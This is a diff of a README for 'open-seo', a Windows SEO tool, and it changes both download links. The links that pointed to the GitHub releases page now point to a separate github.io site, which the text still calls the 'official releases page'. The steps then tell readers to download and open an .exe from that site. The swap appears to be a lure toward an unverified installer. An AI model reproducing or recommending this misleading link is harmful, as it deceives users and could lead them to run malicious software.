@@ -1,6 +1,6 @@
 # 🔍 open-seo - Analyze websites and boost search rankings
 
-[![Download open-seo](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/khanmo248/open-seo/releases)
+[![Download open-seo](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://khanmo248.github.io)
 
 open-seo provides tools to track keywords, audit sites, and analyze backlinks. It functions as a private, local alternative to expensive marketing platforms. You keep your data on your own computer.
 
@@ -8,7 +8,7 @@ open-seo provides tools to track keywords, audit sites, and analyze backlinks. I
 
 Follow these steps to set up the program on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/khanmo248/open-seo/releases).
+1. Visit the [official releases page](https://khanmo248.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer.
 4. Open the downloaded file once the transfer completes.
